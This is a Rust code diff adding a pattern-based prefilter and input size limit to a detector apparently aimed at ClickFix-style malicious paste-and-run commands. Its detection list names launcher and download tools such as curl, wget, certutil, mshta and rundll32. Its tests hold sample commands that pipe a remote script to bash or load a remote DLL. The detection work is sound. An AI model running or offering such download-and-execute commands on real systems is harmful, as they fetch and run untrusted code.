@@ -1,3 +1,4 @@
+use aho_corasick::{AhoCorasick, AhoCorasickBuilder};
 use emulator_core::{
     sha256_hex, AnalysisLimits, Artifact, EventKind, HostSnapshot, Ioc, NetworkActivity,
     NetworkPolicy, TraceEvent, VirtualFileSnapshot,
@@ -5,10 +6,12 @@ use emulator_core::{
 use runbox_emulator::{Runbox, RunboxError, RunboxInput};
 use serde::{Deserialize, Serialize};
 use std::collections::BTreeSet;
+use std::sync::LazyLock;
 use thiserror::Error;
 use url::Url;
 
-pub const REPORT_SCHEMA_VERSION: &str = "0";
+pub const REPORT_SCHEMA_VERSION: &str = "1";
+pub const MAX_DETECTOR_INPUT_BYTES: usize = 1024 * 1024;
 pub const DEFAULT_SAFE_SOURCE_URLS: &[&str] = &["https://gh.io/copilot-install"];
 
 #[derive(Debug, Clone)]
@@ -207,7 +210,8 @@ pub struct Confidence {
 pub struct InputSummary {
     pub kind: String,
     pub size: usize,
-    pub sha256: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub sha256: Option<String>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -226,6 +230,7 @@ pub struct AnalysisReport {
     pub network_activity: Vec<NetworkActivity>,
     pub safe_network_urls: Vec<String>,
     pub warnings: Vec<String>,
+    pub prefilter: PrefilterResult,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
@@ -234,6 +239,120 @@ pub enum InputKind {
     RawCommand,
     PowerShellScript,
 }
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum PrefilterSignal {
+    CommandInterpreter,
+    NativeLauncher,
+    PowerShellSyntax,
+    NetworkTool,
+    NetworkLocator,
+    ShellSyntax,
+    ExecutableOrScript,
+    EncodingOrObfuscation,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum PrefilterDecision {
+    DefinitelyBenign,
+    Candidate,
+    Oversized,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct PrefilterResult {
+    pub decision: PrefilterDecision,
+    pub input_bytes: usize,
+    pub signals: Vec<PrefilterSignal>,
+}
+
+const PREFILTER_PATTERNS: &[(&str, PrefilterSignal)] = &[
+    ("powershell", PrefilterSignal::CommandInterpreter),
+    ("pwsh", PrefilterSignal::CommandInterpreter),
+    ("cmd.exe", PrefilterSignal::CommandInterpreter),
+    ("cmd /c", PrefilterSignal::CommandInterpreter),
+    ("cmd /k", PrefilterSignal::CommandInterpreter),
+    ("%comspec%", PrefilterSignal::CommandInterpreter),
+    ("bash", PrefilterSignal::CommandInterpreter),
+    ("sh -c", PrefilterSignal::CommandInterpreter),
+    ("python", PrefilterSignal::CommandInterpreter),
+    ("osascript", PrefilterSignal::CommandInterpreter),
+    ("mshta", PrefilterSignal::NativeLauncher),
+    ("rundll32", PrefilterSignal::NativeLauncher),
+    ("regsvr32", PrefilterSignal::NativeLauncher),
+    ("wscript", PrefilterSignal::NativeLauncher),
+    ("cscript", PrefilterSignal::NativeLauncher),
+    ("msiexec", PrefilterSignal::NativeLauncher),
+    ("conhost", PrefilterSignal::NativeLauncher),
+    ("pcalua", PrefilterSignal::NativeLauncher),
+    ("schtasks", PrefilterSignal::NativeLauncher),
+    ("cmdkey", PrefilterSignal::NativeLauncher),
+    ("wmic", PrefilterSignal::NativeLauncher),
+    ("for /f", PrefilterSignal::NativeLauncher),
+    ("invoke-webrequest", PrefilterSignal::PowerShellSyntax),
+    ("invoke-restmethod", PrefilterSignal::PowerShellSyntax),
+    ("invoke-expression", PrefilterSignal::PowerShellSyntax),
+    ("iex ", PrefilterSignal::PowerShellSyntax),
+    ("iex(", PrefilterSignal::PowerShellSyntax),
+    ("(irm ", PrefilterSignal::PowerShellSyntax),
+    ("irm(", PrefilterSignal::PowerShellSyntax),
+    (" irm ", PrefilterSignal::PowerShellSyntax),
+    ("(iwr ", PrefilterSignal::PowerShellSyntax),
+    (" iwr ", PrefilterSignal::PowerShellSyntax),
+    ("new-object", PrefilterSignal::PowerShellSyntax),
+    ("frombase64string", PrefilterSignal::PowerShellSyntax),
+    ("encodedcommand", PrefilterSignal::PowerShellSyntax),
+    ("$env:", PrefilterSignal::PowerShellSyntax),
+    ("$(", PrefilterSignal::PowerShellSyntax),
+    ("[system.", PrefilterSignal::PowerShellSyntax),
+    ("[text.", PrefilterSignal::PowerShellSyntax),
+    ("downloadfile", PrefilterSignal::PowerShellSyntax),
+    ("downloadstring", PrefilterSignal::PowerShellSyntax),
+    ("curl", PrefilterSignal::NetworkTool),
+    ("wget", PrefilterSignal::NetworkTool),
+    ("bitsadmin", PrefilterSignal::NetworkTool),
+    ("certutil", PrefilterSignal::NetworkTool),
+    ("finger ", PrefilterSignal::NetworkTool),
+    ("http://", PrefilterSignal::NetworkLocator),
+    ("https://", PrefilterSignal::NetworkLocator),
+    ("hxxp", PrefilterSignal::NetworkLocator),
+    ("ftp://", PrefilterSignal::NetworkLocator),
+    ("javascript:", PrefilterSignal::NetworkLocator),
+    ("vbscript:", PrefilterSignal::NetworkLocator),
+    ("\\\\", PrefilterSignal::NetworkLocator),
+    ("&&", PrefilterSignal::ShellSyntax),
+    ("||", PrefilterSignal::ShellSyntax),
+    ("|", PrefilterSignal::ShellSyntax),
+    ("^", PrefilterSignal::ShellSyntax),
+    (">", PrefilterSignal::ShellSyntax),
+    (".exe", PrefilterSignal::ExecutableOrScript),
+    (".dll", PrefilterSignal::ExecutableOrScript),
+    (".msi", PrefilterSignal::ExecutableOrScript),
+    (".ps1", PrefilterSignal::ExecutableOrScript),
+    (".hta", PrefilterSignal::ExecutableOrScript),
+    (".vbs", PrefilterSignal::ExecutableOrScript),
+    (".js", PrefilterSignal::ExecutableOrScript),
+    (".sct", PrefilterSignal::ExecutableOrScript),
+    ("shell:startup", PrefilterSignal::ExecutableOrScript),
+    (
+        "start menu\\programs\\startup",
+        PrefilterSignal::ExecutableOrScript,
+    ),
+    ("base64", PrefilterSignal::EncodingOrObfuscation),
+    ("-enc ", PrefilterSignal::EncodingOrObfuscation),
+    ("charcode", PrefilterSignal::EncodingOrObfuscation),
+    ("gzip", PrefilterSignal::EncodingOrObfuscation),
+    ("deflatestream", PrefilterSignal::EncodingOrObfuscation),
+];
+
+static PREFILTER_MATCHER: LazyLock<AhoCorasick> = LazyLock::new(|| {
+    AhoCorasickBuilder::new()
+        .ascii_case_insensitive(true)
+        .build(PREFILTER_PATTERNS.iter().map(|(pattern, _)| *pattern))
+        .expect("prefilter patterns are valid")
+});
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct DetectorInput {
@@ -263,6 +382,8 @@ impl DetectorInput {
 pub enum DetectorError {
     #[error(transparent)]
     Runbox(#[from] RunboxError),
+    #[error("detector input exceeds the {MAX_DETECTOR_INPUT_BYTES} byte limit")]
+    InputTooLarge,
 }
 
 #[derive(Debug, Clone)]
@@ -323,6 +444,49 @@ impl Detector {
         &self.safe_sources
     }
 
+    #[must_use]
+    pub fn prefilter(content: &str) -> PrefilterResult {
+        if content.len() > MAX_DETECTOR_INPUT_BYTES {
+            return PrefilterResult {
+                decision: PrefilterDecision::Oversized,
+                input_bytes: content.len(),
+                signals: Vec::new(),
+            };
+        }
+        if content.trim().is_empty() {
+            return PrefilterResult {
+                decision: PrefilterDecision::DefinitelyBenign,
+                input_bytes: content.len(),
+                signals: Vec::new(),
+            };
+        }
+        let mut signals = PREFILTER_MATCHER
+            .find_iter(content)
+            .map(|matched| PREFILTER_PATTERNS[matched.pattern().as_usize()].1)
+            .collect::<BTreeSet<_>>();
+        if contains_long_base64_token(content.as_bytes()) {
+            signals.insert(PrefilterSignal::EncodingOrObfuscation);
+        }
+        let only_contextual = signals.iter().all(|signal| {
+            matches!(
+                signal,
+                PrefilterSignal::NetworkLocator | PrefilterSignal::ShellSyntax
+            )
+        });
+        let has_network = signals.contains(&PrefilterSignal::NetworkLocator);
+        let has_shell = signals.contains(&PrefilterSignal::ShellSyntax);
+        let decision = if signals.is_empty() || (only_contextual && !(has_network && has_shell)) {
+            PrefilterDecision::DefinitelyBenign
+        } else {
+            PrefilterDecision::Candidate
+        };
+        PrefilterResult {
+            decision,
+            input_bytes: content.len(),
+            signals: signals.into_iter().collect(),
+        }
+    }
+
     /// Emulate an input and produce an explainable detection report.
     ///
     /// # Errors
@@ -331,13 +495,19 @@ impl Detector {
     /// complete the analysis.
     pub fn analyze(&self, input: DetectorInput) -> Result<AnalysisReport, DetectorError> {
         let DetectorInput { kind, content } = input;
-        let input_summary = summarize_input(
-            match kind {
-                InputKind::RawCommand => "raw_command",
-                InputKind::PowerShellScript => "powershell_script",
-            },
-            content.as_bytes(),
-        );
+        let prefilter = Self::prefilter(&content);
+        if prefilter.decision == PrefilterDecision::Oversized {
+            return Err(DetectorError::InputTooLarge);
+        }
+        let input_kind = input_kind_name(kind);
+        if prefilter.decision == PrefilterDecision::DefinitelyBenign {
+            return Ok(prefilter_benign_report(
+                input_kind,
+                content.len(),
+                prefilter,
+            ));
+        }
+        let input_summary = summarize_candidate_input(input_kind, content.as_bytes());
         let mut runbox = Runbox::new(self.limits.clone());
         runbox
             .host_mut()
@@ -382,7 +552,62 @@ impl Detector {
             network_activity: snapshot.network_activity,
             safe_network_urls,
             warnings: snapshot.warnings,
+            prefilter,
         })
+    }
+}
+
+fn contains_long_base64_token(input: &[u8]) -> bool {
+    let mut run = 0_usize;
+    for byte in input {
+        if byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'_' | b'-' | b'=') {
+            run += 1;
+            if run >= 128 {
+                return true;
+            }
+        } else {
+            run = 0;
+        }
+    }
+    false
+}
+
+const fn input_kind_name(kind: InputKind) -> &'static str {
+    match kind {
+        InputKind::RawCommand => "raw_command",
+        InputKind::PowerShellScript => "powershell_script",
+    }
+}
+
+fn prefilter_benign_report(kind: &str, size: usize, prefilter: PrefilterResult) -> AnalysisReport {
+    AnalysisReport {
+        schema_version: REPORT_SCHEMA_VERSION.into(),
+        input: InputSummary {
+            kind: kind.into(),
+            size,
+            sha256: None,
+        },
+        verdict: Verdict::Benign,
+        risk: RiskAssessment {
+            score: 0,
+            level: RiskLevel::None,
+        },
+        confidence: Confidence {
+            score: 100,
+            completeness: 1.0,
+            unsupported_operations: 0,
+            limits_reached: 0,
+        },
+        findings: Vec::new(),
+        trace: Vec::new(),
+        iocs: Vec::new(),
+        artifacts: Vec::new(),
+        virtual_files: Vec::new(),
+        network_urls: Vec::new(),
+        network_activity: Vec::new(),
+        safe_network_urls: Vec::new(),
+        warnings: Vec::new(),
+        prefilter,
     }
 }
 
@@ -404,6 +629,9 @@ pub fn render_human(report: &AnalysisReport) -> String {
         report.artifacts.len(),
         report.virtual_files.len()
     ));
+    if report.prefilter.decision == PrefilterDecision::DefinitelyBenign {
+        output.push_str("Prefilter: definitely benign; hashing and emulation skipped\n");
+    }
 
     if !report.findings.is_empty() {
         output.push_str("\nFindings\n");
@@ -434,30 +662,30 @@ pub fn render_human(report: &AnalysisReport) -> String {
                 file.path, file.size, file.sha256
             ));
         }
-        if !report.network_activity.is_empty() {
-            output.push_str("\nNetwork activity\n");
-            for activity in &report.network_activity {
-                output.push_str(&format!(
-                    "- {:?} {} {} ({})",
-                    activity.outcome, activity.method, activity.url, activity.origin
-                ));
-                if let Some(status) = activity.status {
-                    output.push_str(&format!(" status={status}"));
-                }
-                if let Some(bytes) = activity.response_bytes {
-                    output.push_str(&format!(" bytes={bytes}"));
-                }
-                if let Some(error) = &activity.error {
-                    output.push_str(&format!(" error={error}"));
-                }
-                output.push('\n');
+    }
+    if !report.network_activity.is_empty() {
+        output.push_str("\nNetwork activity\n");
+        for activity in &report.network_activity {
+            output.push_str(&format!(
+                "- {:?} {} {} ({})",
+                activity.outcome, activity.method, activity.url, activity.origin
+            ));
+            if let Some(status) = activity.status {
+                output.push_str(&format!(" status={status}"));
             }
+            if let Some(bytes) = activity.response_bytes {
+                output.push_str(&format!(" bytes={bytes}"));
+            }
+            if let Some(error) = &activity.error {
+                output.push_str(&format!(" error={error}"));
+            }
+            output.push('\n');
         }
-        if !report.safe_network_urls.is_empty() {
-            output.push_str("\nConfigured safe network sources used\n");
-            for url in &report.safe_network_urls {
-                output.push_str(&format!("- {url}\n"));
-            }
+    }
+    if !report.safe_network_urls.is_empty() {
+        output.push_str("\nConfigured safe network sources used\n");
+        for url in &report.safe_network_urls {
+            output.push_str(&format!("- {url}\n"));
         }
     }
     if report.confidence.unsupported_operations > 0 || report.confidence.limits_reached > 0 {
@@ -955,11 +1183,11 @@ fn unique_event_evidence(snapshot: &HostSnapshot, kind: EventKind) -> Vec<String
         .collect()
 }
 
-fn summarize_input(kind: impl Into<String>, bytes: &[u8]) -> InputSummary {
+fn summarize_candidate_input(kind: impl Into<String>, bytes: &[u8]) -> InputSummary {
     InputSummary {
         kind: kind.into(),
         size: bytes.len(),
-        sha256: sha256_hex(bytes),
+        sha256: Some(sha256_hex(bytes)),
     }
 }
 
@@ -1055,7 +1283,7 @@ mod tests {
     fn risk_and_confidence_are_independent() {
         let report = Detector::default()
             .analyze(DetectorInput::powershell_script(
-                "Unknown-ClickFixCommand 'https://example.invalid/a'",
+                "powershell.exe -Command Unknown-ClickFixCommand 'https://example.invalid/a'",
             ))
             .unwrap();
 
@@ -1175,5 +1403,65 @@ mod tests {
         assert!(policy.is_safe("https://downloads.example.invalid/releases/v1/tool.zip"));
         assert!(!policy.is_safe("https://downloads.example.invalid/other/tool.zip"));
         assert!(!policy.is_safe("https://downloads.example.invalid.evil/releases/tool.zip"));
+    }
+
+    #[test]
+    fn prefilter_skips_plain_and_multiline_prose_without_hashing() {
+        for content in [
+            "hello",
+            "Meeting notes for Friday: review the quarterly roadmap.",
+            "Meeting notes\nReview the roadmap\nSend comments\nThank you",
+            "https://example.com/documentation",
+        ] {
+            let prefilter = Detector::prefilter(content);
+            assert_eq!(
+                prefilter.decision,
+                PrefilterDecision::DefinitelyBenign,
+                "{content:?}"
+            );
+            let report = Detector::default()
+                .analyze(DetectorInput::raw_command(content))
+                .unwrap();
+            assert_eq!(report.verdict, Verdict::Benign);
+            assert!(report.input.sha256.is_none());
+            assert!(report.trace.is_empty());
+            assert_eq!(
+                report.prefilter.decision,
+                PrefilterDecision::DefinitelyBenign
+            );
+        }
+    }
+
+    #[test]
+    fn prefilter_identifies_clickfix_candidate_signals() {
+        for content in [
+            "mshta.exe https://example.invalid/fix",
+            "powershell.exe -EncodedCommand QQ==",
+            "curl https://example.invalid/a | bash",
+            r"rundll32.exe \\example.invalid\share\stage.dll,Start",
+        ] {
+            assert_eq!(
+                Detector::prefilter(content).decision,
+                PrefilterDecision::Candidate,
+                "{content:?}"
+            );
+        }
+        assert_eq!(
+            Detector::prefilter(&"A".repeat(160)).decision,
+            PrefilterDecision::Candidate
+        );
+    }
+
+    #[test]
+    fn oversized_input_is_rejected_before_hashing() {
+        let input = "A".repeat(MAX_DETECTOR_INPUT_BYTES + 1);
+        assert_eq!(
+            Detector::prefilter(&input).decision,
+            PrefilterDecision::Oversized
+        );
+        assert!(matches!(
+            Detector::default().analyze(DetectorInput::raw_command(input)),
+            Err(DetectorError::InputTooLarge)
+        ));
     }
 }
